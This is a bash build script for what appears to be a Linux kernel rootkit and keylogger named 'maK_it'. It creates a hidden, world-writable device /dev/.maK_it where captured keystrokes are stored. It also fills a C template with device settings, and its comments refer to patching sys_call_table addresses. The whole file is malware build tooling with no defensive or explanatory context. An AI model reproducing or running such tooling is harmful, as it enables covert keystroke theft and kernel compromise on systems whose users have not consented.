#!/bin/bash
#used to insert the memory addresses of sys_call_table
#used to insert name of device where logged keys are stored



KERN=$(uname -r)
IN="template.c"
OUT="maK_it.c"

BREAK="----------------------------"

echo $BREAK
#Templates to be replaced
DEV="DEVICE_NAME_TEMPLATE"
MAJOR="DEVICE_MAJOR_TEMPLATE"
ARG1=".maK_it"
ARG2="33"

DEV_NAME="DEVICE_NAME \"$ARG1\""
MAJ_NAME="DEVICE_MAJOR $ARG2"

echo "Building '$OUT' file using /dev/$ARG1 for Device Name and $ARG2 as a Major Number..."
rm -f /dev/$ARG1 #Making sure it's cleared
echo "Creating virtual device /dev/$ARG1"
mknod /dev/$ARG1 c $ARG2 0
chmod 777 /dev/$ARG1
echo "Keys will be logged to virtual device."
sed -e "s/$DEV/$DEV_NAME/g;s/$MAJOR/$MAJ_NAME/g" < $IN  > $OUT
echo "Completed. Run make command"
echo $BREAK

